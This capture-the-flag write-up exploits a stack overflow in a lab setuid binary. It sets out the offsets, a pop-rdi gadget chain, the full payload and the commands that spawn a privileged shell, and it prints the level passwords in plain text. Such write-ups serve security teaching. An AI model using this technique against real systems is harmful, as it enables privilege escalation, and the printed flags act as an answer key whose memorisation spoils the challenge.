# level01 — pentest report

## Concept

Hidden/unreferenced function reached via a stack buffer overflow. Same
overflow primitive as level00 (no canary, no PIE, ASLR off) but the target
this time is a "win function" already present in the binary that does its
own `setreuid()` + `execl()` — the challenge is purely about redirecting
control flow to it with the correct argument, not building a ROP chain
from scratch.

## Recon

```
$ ssh level01@<vm-ip> -p 4242            # password = level00's flag: czugaihitjx0lys47blkh0qwtzz1c9g6
level01@rainfall:~$ ls -la
-rwsr-x---  1 flag01  level01 16592 Jun  9 23:13 ono
-r--r--r--  1 level01 level01  1610 Jun  9 23:13 ono.c
level01@rainfall:~$ cat README
She had mirrored glasses. She knew exactly where to hit.
```
Note: unlike level00, `~/.cache` here is writable (`drwx------`) — the
whole home directory is not necessarily read-only per level; didn't end up
needing it since `read()` (unlike `gets()`) has no delimiter to worry
about and the exploit needed no on-disk staging.

```
$ cat ono.c
```
Two things jump out immediately:

```c
static void __attribute__((noinline)) maintenance_exec(long code)
{
    if (code == 0xdeadbeefL) {
        setreuid(geteuid(), geteuid());
        execl("/bin/sh", "sh", NULL);
    }
}
```
Never called anywhere in `main()` / `run_diagnostic()` — dead code from
the compiler's point of view, but still linked into the binary (`noinline`
guarantees it survives as a real, callable function rather than being
inlined away or optimized out). It's reachable via a control-flow hijack
with `code == 0xdeadbeef` in `rdi` (x86-64 first-argument register).

```c
static void run_diagnostic(void)
{
    char op_id[OPERATOR_LEN];              // 64 bytes
    print_header();
    read(STDIN_FILENO, op_id, 256);        // <-- reads up to 256 into 64
    strncpy(ctx.last_op, op_id, OPERATOR_LEN - 1);
    if (strncmp(op_id, "ONO_", 4) == 0) { ... }
    ...
}
```
`read()` (not `gets()`) — no newline-termination behavior to worry about,
so every byte of the payload, including `0x0a`, can be delivered safely in
one shot (this was the single biggest source of pain in level00; not an
issue here). Confirms the overflow: 256-byte read into a 64-byte buffer,
no length check anywhere before or after.

```
$ checksec --file=./ono
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
$ cat /proc/sys/kernel/randomize_va_space
0
```
Same protection profile as level00 — no canary, no PIE, ASLR off.

```
$ objdump -d -M intel ./ono | sed -n '/<run_diagnostic>:/,/^$/p'
401396: sub rsp,0x40                       ; 64-byte local frame
4013a7: lea rax,[rbp-0x40]; ...; call read@plt
...
40144b: ret
```
`sub rsp,0x40` → buffer at `rbp-0x40`, so offset to the saved return
address = `0x40` (64) + 8 (saved rbp) = 72 bytes. Consistent with
level00's identical frame-layout reasoning; no need to re-derive this with
a cyclic pattern given the disassembly is this explicit and matched on the
first try.

```
$ objdump -d -M intel ./ono | sed -n '/<maintenance_exec>:/,/^$/p'
401276: endbr64
...
401287: mov eax,0xdeadbeef
40128c: cmp QWORD PTR [rbp-0x18],rax        ; compares against saved rdi
401290: jne 4012ca                          ; skip payload if mismatch
401292: call geteuid@plt
...
4012a2: call setreuid@plt
...
4012c5: call execl@plt
```
`maintenance_exec` at fixed address `0x401276` (non-PIE). Confirms: jump
here with `rdi == 0xdeadbeef` and the function does everything itself.

```
$ ldd ./ono
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7c00000)
```
Same libc base as level00 (expected: ASLR is off system-wide and this is
the same running VM) — reused the `pop rdi ; ret` gadget already found
and byte-checked in level00's recon (`0x10f78b`, confirmed clean of any
`0x0a` byte, though it wouldn't matter here since `read()` isn't
delimiter-sensitive).

## Retrieving the addresses, command by command

`maintenance_exec` reads its argument from `rdi` (per the
`mov QWORD PTR [rbp-0x18],rdi` at entry), which is only meaningful if the
function is entered via a real `call` or a `ret`-hijack immediately
preceded by a gadget that loads `rdi` — a bare return-address overwrite to
`0x401276` alone would jump in with whatever garbage happens to be in
`rdi` at that point (leftover from `read()`/`strncpy()`/`strncmp()`, not
controlled and not reliably `0xdeadbeef`). So the chain has to load `rdi`
explicitly first, via the `pop rdi ; ret` gadget already located above,
then land on `maintenance_exec`:

```
payload = b"A"*72 + pop_rdi_ret + p64(0xdeadbeef) + p64(0x401276)
```
```
$ (cat exploit.bin; sleep 2; printf 'echo MARKER_OK\nid\ncat /home/flag01/.pass\nexit\n') \
    | ssh level01@<vm-ip> -p 4242 ./ono
  [ONO-SENDAI VII] Waiting for operator ID: MARKER_OK
uid=1018(flag01) gid=1004(level01) groups=1004(level01),1001(levelgroup)
3309s5bx9kagi0z0qt0erxvivievlh86
```
Worked on the first try — `uid=1018(flag01)` confirms `setreuid()` inside
`maintenance_exec` did its job, and unlike level00's manual
`execve(NULL,NULL)` dead end, `execl("/bin/sh","sh",NULL)` passes a real
`argv[0]`, so the spawned shell has no reason to defensively drop
privileges. The `sleep 2` between the exploit line and the follow-up
commands is the same stdio-over-read precaution learned in level00 (the
overflow itself uses `read()`, not `gets()`, but the second command — the
interactive shell reading from the same piped stdin — is still subject to
it, since it's a plain shell reading a script from a pipe).

Level00's much harder debugging directly paid off here: the `0x0a`-byte
gadget check, the "delay follow-up commands" trick, and the "prefer a
technique that syncs real/effective uid before spawning a shell" lesson
all transferred straight over.

## Exploit

```
$ python3 exploit.py > payload.bin
$ (cat payload.bin; sleep 2; printf 'cat /home/flag01/.pass\nexit\n') \
    | ssh level01@<vm-ip> -p 4242 ./ono
```
1. Overflow `op_id[64]` with 72 bytes of junk to reach the saved return
   address.
2. Overwrite it with `pop rdi ; ret` (libc, `0x7ffff7d0f78b`).
3. Next 8 bytes: `0xdeadbeef`, popped into `rdi`.
4. Next 8 bytes: `maintenance_exec`'s address (`0x401276`) — the gadget's
   own `ret` jumps here with `rdi` now correctly set.
5. `maintenance_exec` verifies the magic value, calls
   `setreuid(geteuid(), geteuid())`, then `execl("/bin/sh", "sh", NULL)`.

Verified as the real level02 password:
```
$ ssh level02@<vm-ip> -p 4242
Password: 3309s5bx9kagi0z0qt0erxvivievlh86
level02@rainfall:~$ id
uid=1003(level02) ...
```

